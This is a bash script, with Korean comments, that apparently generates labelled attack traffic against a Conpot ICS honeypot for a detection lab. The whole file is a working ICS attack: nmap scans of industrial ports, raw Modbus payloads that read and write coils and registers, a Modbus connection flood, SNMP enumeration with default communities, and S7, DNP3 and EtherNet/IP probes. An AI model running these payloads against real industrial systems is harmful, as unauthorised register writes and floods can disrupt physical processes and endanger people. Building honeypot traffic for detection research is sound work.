#!/bin/bash
# 시나리오 09: ICS/SCADA 공격
# Label: Recon
# 도구: nmap, nc, python3, snmpwalk
# 설명: Conpot ICS 허니팟 대상 Modbus/SNMP/S7 프로토콜 공격 및 레지스터 열거

LABEL="Recon"
SCENARIO="ics_attack"
echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"start\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"

CONPOT_IP="172.30.0.16"

echo "[*] ICS/SCADA service discovery scan"
nmap -sV -T4 -p 102,502,161,47808,44818 "$CONPOT_IP" 2>/dev/null || true

echo "[*] Modbus TCP - register enumeration (port 502)"
python3 << 'PYEOF'
import socket, time

target = '172.30.0.16'
port = 502

# Modbus TCP 요청 페이로드 (다양한 Function Code)
requests = [
    ('Read Coils (FC01)',              bytes.fromhex('000100000006010100000064')),
    ('Read Discrete Inputs (FC02)',    bytes.fromhex('000200000006010200000064')),
    ('Read Holding Registers (FC03)',  bytes.fromhex('000300000006010300000064')),
    ('Read Input Registers (FC04)',    bytes.fromhex('000400000006010400000064')),
    ('Write Single Coil (FC05)',       bytes.fromhex('0005000000060105000000ff00')),
    ('Write Single Register (FC06)',   bytes.fromhex('000600000006010600010001')),
    ('Write Multiple Coils (FC15)',    bytes.fromhex('000700000009010f000000080101')),
    ('Write Multiple Registers (FC16)',bytes.fromhex('00080000000b01100000000202dead')),
]

for i in range(15):
    for name, payload in requests:
        try:
            s = socket.create_connection((target, port), timeout=2)
            s.send(payload)
            s.recv(512)
            s.close()
        except Exception:
            pass
        time.sleep(0.05)
    time.sleep(0.2)
print(f"[modbus] {15 * len(requests)} requests sent")
PYEOF

echo "[*] Modbus TCP connection flood"
for i in $(seq 1 30); do
    echo "" | nc -w 1 "$CONPOT_IP" 502 2>/dev/null || true
done

echo "[*] SNMP enumeration (UDP 161)"
snmpwalk -v2c -c public "$CONPOT_IP" 2>/dev/null | head -50 || true
snmpwalk -v1  -c public "$CONPOT_IP" 2>/dev/null | head -50 || true
snmpwalk -v2c -c private "$CONPOT_IP" 2>/dev/null | head -20 || true

# SNMP GET 다양한 OID
for oid in 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.5.0 1.3.6.1.2.1.1.6.0 1.3.6.1.2.1.25.1.1.0; do
    snmpget -v2c -c public "$CONPOT_IP" "$oid" 2>/dev/null || true
done

echo "[*] S7 protocol scan (port 102)"
python3 << 'PYEOF'
import socket, time

target = '172.30.0.16'
port = 102

# TPKT/COTP connection request + S7 communication setup
# COTP Connection Request
cotp_cr = bytes([
    0x03, 0x00, 0x00, 0x16,   # TPKT header
    0x11, 0xe0, 0x00, 0x00,   # COTP CR
    0x00, 0x01, 0x00,
    0xc0, 0x01, 0x0a,
    0xc1, 0x02, 0x01, 0x00,
    0xc2, 0x02, 0x01, 0x02,
])

for i in range(20):
    try:
        s = socket.create_connection((target, port), timeout=2)
        s.send(cotp_cr)
        s.recv(256)
        s.close()
    except Exception:
        pass
    time.sleep(0.1)
print("[s7] 20 connection attempts sent")
PYEOF

echo "[*] DNP3 scan (port 20000)"
nc -w 2 "$CONPOT_IP" 20000 < /dev/null 2>/dev/null || true

echo "[*] EtherNet/IP scan (port 44818)"
python3 -c "
import socket
try:
    s = socket.create_connection(('$CONPOT_IP', 44818), timeout=2)
    # EtherNet/IP List Identity command
    s.send(bytes.fromhex('6300000000000000000000000000000000000000000000'))
    s.recv(256)
    s.close()
except: pass
" 2>/dev/null || true

echo "[*] Additional Modbus scan with nmap scripts"
nmap -sV -p 502 --script modbus-discover "$CONPOT_IP" 2>/dev/null || true
nmap -sU -p 161 --script snmp-info "$CONPOT_IP" 2>/dev/null || true

echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
